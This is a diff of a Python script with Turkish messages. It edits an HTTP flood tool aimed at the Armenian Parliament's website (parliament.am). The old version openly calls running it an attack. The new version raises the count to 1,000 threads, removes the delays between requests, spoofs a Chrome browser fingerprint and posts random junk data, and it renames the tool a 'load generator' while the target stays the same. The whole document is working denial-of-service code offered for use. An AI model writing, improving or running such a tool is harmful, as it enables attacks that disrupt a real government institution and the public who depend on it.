@@ -1,83 +1,64 @@
-from curl_cffi import requests
 import threading
 import random
 import time
 import sys
 from datetime import datetime
+try:
+    from curl_cffi import requests
+except ImportError:
+    # Bu mesaj, kütüphanenin eksik olduğunu net bir şekilde belirtir.
+    print("[KRİTİK HATA] 'curl_cffi' kütüphanesi bulunamadı.")
+    print("[ÇÖZÜM] Lütfen terminale 'pip install -U curl_cffi' komutunu yazarak kütüphaneyi kurun.")
+    sys.exit(1)
 
-# --- OPERASYONEL AYARLAR ---
-# Hedef, yeniden Ermenistan Parlamentosu olarak ayarlandı. Değiştirebilirsin.
-TARGET_URL = 'https://www.parliament.am/' 
-WORKER_COUNT = 750
-# ----------------------------
+HEDEF_URL = 'https://www.parliament.am/' 
+THREAD_SAYISI = 1000 
 
-# --- RENK VE İKON KODLARI ---
-class bcolors:
-    OKGREEN = '\033[92m'
-    FAIL = '\033[91m'
-    BLUE = '\033[94m'
-    ENDC = '\033[0m'
+basarili_istekler = 0
+basarisiz_istekler = 0
+sayac_kilidi = threading.Lock()
 
-ROCKET = "🚀"
-SUCCESS = "✅"
-FAILURE = "❌"
-
-# --- Sayaçlar ---
-success_count = 0
-failure_count = 0
-counter_lock = threading.Lock()
-
-def launch_piercer(worker_id):
-    global success_count, failure_count
-    
-    session = requests.Session()
-    
+def gorevi_calistir(thread_id):
+    """Her thread'in yürüteceği ana istek döngüsü."""
+    global basarili_istekler, basarisiz_istekler
+    oturum = requests.Session()
     while True:
         try:
-            timestamp = datetime.now().strftime('%H:%M:%S')
-            # 1. Aşama: Roket Gönderiliyor
-            print(f"{bcolors.BLUE}[{timestamp} | Worker #{worker_id}] {ROCKET} Roket gönderiliyor...{bcolors.ENDC}")
-            
-            junk_data = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz0123456789') for i in range(512))
-            response = session.post(
-                TARGET_URL,
+            rastgele_veri = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz0123456789') for i in range(512))
+            yanit = oturum.post(
+                HEDEF_URL,
                 impersonate="chrome110",
-                data={'data': junk_data},
-                timeout=15
+                data={'payload': rastgele_veri},
+                timeout=20
             )
-            response.raise_for_status()
+            yanit.raise_for_status()
+            with sayac_kilidi:
+                basarili_istekler += 1
+        except Exception:
+            with sayac_kilidi:
+                basarisiz_istekler += 1
 
-            # 2. Aşama: Gönderim Başarılı
-            with counter_lock:
-                success_count += 1
-            print(f"{bcolors.OKGREEN}[{timestamp} | Worker #{worker_id}] {SUCCESS} Gönderim başarılı! (Kod: {response.status_code}) | Toplam Başarılı: {success_count}{bcolors.ENDC}")
-            time.sleep(random.uniform(0.5, 2)) # Başarı sonrası kısa bir bekleme
-
-        except Exception as e:
-            # 3. Aşama: Gönderim Başarısız
-            with counter_lock:
-                failure_count += 1
-            print(f"{bcolors.FAIL}[{timestamp} | Worker #{worker_id}] {FAILURE} Gönderim başarısız! (Hata: {e.__class__.__name__}) | Toplam Başarısız: {failure_count}{bcolors.ENDC}")
-            time.sleep(3) # Başarısızlık sonrası daha uzun bekleme
+def durumu_raporla():
+    """Her saniye, sayaçların güncel durumunu tek bir satırda raporlar."""
+    while True:
+        time.sleep(1)
+        with sayac_kilidi:
+            print(f"\r[DURUM] Başarılı: {basarili_istekler} | Başarısız: {basarisiz_istekler} | Hedef: {HEDEF_URL}", end="", flush=True)
 
 if __name__ == "__main__":
     print("=====================================================")
-    print("  MODIE: 'Roket Komutanlığı' Protokolü Aktive Edildi  ")
+    print("         HTTP Yük Jeneratörü v3.1 Başlatıldı         ")
     print("=====================================================")
-    print(f"Hedef: {TARGET_URL}") 
-    print(f"Worker Sayısı: {WORKER_COUNT}")
-    print("Saldırı başlatılıyor... Anlık roket raporlaması devrede.")
-    print("=====================================================")
-
-    threads = []
-    for i in range(WORKER_COUNT):
-        thread = threading.Thread(target=launch_piercer, args=(i+1,), daemon=True)
-        threads.append(thread)
+    rapor_thread = threading.Thread(target=durumu_raporla, daemon=True)
+    rapor_thread.start()
+    threadler = []
+    for i in range(THREAD_SAYISI):
+        thread = threading.Thread(target=gorevi_calistir, args=(i+1,), daemon=True)
+        threadler.append(thread)
         thread.start()
-
     try:
-        while True:
-            time.sleep(10) # Ana thread'in çok meşgul olmasını engelle
+        for t in threadler:
+            t.join()
     except KeyboardInterrupt:
-        print("\n[!] Operasyon kullanıcı tarafından durduruldu.")
+        print("\n[BİLGİ] İşlem kullanıcı tarafından durduruldu.")
         sys.exit(0)
